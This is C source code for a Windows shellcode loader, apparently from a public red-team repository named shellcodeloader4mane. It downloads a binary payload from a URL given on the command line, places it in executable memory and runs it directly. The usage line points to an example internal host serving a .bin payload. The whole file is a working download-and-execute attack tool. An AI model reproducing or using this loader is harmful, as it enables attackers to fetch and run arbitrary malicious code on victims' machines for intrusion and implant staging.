#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>
#pragma comment(lib,"wininet")

typedef void (*fp) (void);

int main(int argc, char const* argv[]) {
    printf("===========================================================================================================\n");
    printf(" #####                               #####                       #                                         \n");
    printf("#     # #    # ###### #      #      #     #  ####  #####  ###### #        ####    ##   #####  ###### ##### \n");
    printf("#       #    # #      #      #      #       #    # #    # #      #       #    #  #  #  #    # #      #    #\n");
    printf(" #####  ###### #####  #      #      #       #    # #    # #####  #       #    # #    # #    # #####  #    #\n");
    printf("      # #    # #      #      #      #       #    # #    # #      #       #    # ###### #    # #      ##### \n");
    printf("#     # #    # #      #      #      #     # #    # #    # #      #       #    # #    # #    # #      #   # \n");
    printf(" #####  #    # ###### ###### ######  #####   ####  #####  ###### #######  ####  #    # #####  ###### #    #\n");
    printf("-----------------------------------------------------------------------------------------------------------\n");
    printf("               ##   https://github.com/manesec/shellcodeloader4mane   x  @manesec   ##\n");
    printf("===========================================================================================================\n\n");
	if (argc == 2)
	{

        HINTERNET hInternet, hConnect;
        const char* url = argv[1];

        // Initialize WinINet
        hInternet = InternetOpenA("HTTP Download", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet == NULL) {
            printf("[ERROR] Failed to initialize WinINet.\n");
            return -1;
        }

        // Open the connection
        hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect == NULL) {
            printf("[ERROR] Failed to open the connection.\n");
            InternetCloseHandle(hInternet);
            return -1;
        }

        
        // Download shellcode
		printf("[INFO] Downloading shellcode ");
        char* CommitBuffer = NULL;
        int HTTPBufferSize = 1024 * 1024;  // 1MB Buffer
        char* HTTPTMPbuffer = (char *)malloc(HTTPBufferSize * sizeof(char));

        DWORD realFileSize = 0;
		DWORD bytesRead = 0;
		DWORD ReadTimes = 0;
        while (InternetReadFile(hConnect, HTTPTMPbuffer,HTTPBufferSize, &bytesRead) && bytesRead > 0) {
            realFileSize += bytesRead;
            printf(".");

            if (ReadTimes == 0) {
                CommitBuffer = (char*)malloc(HTTPBufferSize * sizeof(char));
                memcpy(CommitBuffer, HTTPTMPbuffer, bytesRead);
            } else {
                char* tmpBuffer =  (char*)malloc( (HTTPBufferSize * sizeof(char)) * ReadTimes + bytesRead);
                memcpy(tmpBuffer, CommitBuffer, (HTTPBufferSize * sizeof(char)) * ReadTimes);
                memcpy(tmpBuffer + (HTTPBufferSize * sizeof(char)) * ReadTimes, HTTPTMPbuffer, bytesRead);
                free(CommitBuffer);
                CommitBuffer = tmpBuffer;
            }

            ReadTimes++; 
        }

        printf("\n[INFO] Final Size: %lu \n" , realFileSize);
		printf("[INFO] Allocating Memory ...\n");

        // Load shellcode
		char* buffer = NULL;
		buffer = (char*)VirtualAlloc(NULL,realFileSize + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(buffer, CommitBuffer, realFileSize);
        free(CommitBuffer);
		if (buffer != NULL)
		{
			fp loaded_shell = (fp)buffer;
			loaded_shell();

			printf("[INFO] Shell Loading Done.\n");
			VirtualFree(buffer, 0, MEM_RELEASE);
			return 0;
		}
		else
		{
			printf("[ERROR] Could not allocate memory for buffer.\n");

		}

        // Cleanup
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);

        return 0;
	}
	else
	{
		printf("loaderFromHTTPWithC.exe <http://10.10.10.10/mane.bin>");
		return -1;
	}

}